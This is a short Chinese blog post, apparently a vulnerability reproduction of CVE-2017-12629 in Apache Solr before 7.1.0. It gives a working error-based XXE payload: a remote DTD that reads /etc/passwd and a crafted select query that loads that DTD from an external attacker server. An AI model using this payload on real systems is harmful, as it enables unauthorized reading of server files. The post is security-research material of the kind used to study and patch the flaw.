# 【Apache Solr CVE-2017-12629】 - 任尔东西南北风 - 博客园

> 原文：[`www.cnblogs.com/lyh1/p/17545443.html`](https://www.cnblogs.com/lyh1/p/17545443.html)

Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。原理大致是文档通过 Http 利用 XML 加到一个搜索集合中。查询该集合也是通过 http 收到一个 XML/JSON 响应来实现。此次 7.1.0 之前版本总共爆出两个漏洞：XML 实体扩展漏洞（XXE）和远程命令执行漏洞（RCE），二者可以连接成利用链，编号均为 CVE-2017-12629。

漏洞复现：

利用 Error Based XXE 读取文件：

远程服务器

passwd.dtd

```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % ent "<!ENTITY data SYSTEM ':%file;'>">
```

payload 对 q 参数 url 编码

```
/solr/demo/select?&q=<?xml version="1.0" ?><!DOCTYPE root[<!ENTITY % ext SYSTEM "http://1.:8777/passwd.dtd">%ext;%ent;]><r>&data;</r>&wt=xml&defType=xmlparser
```

![](img/324f7b8b8ab805359857aa5043c23057.png)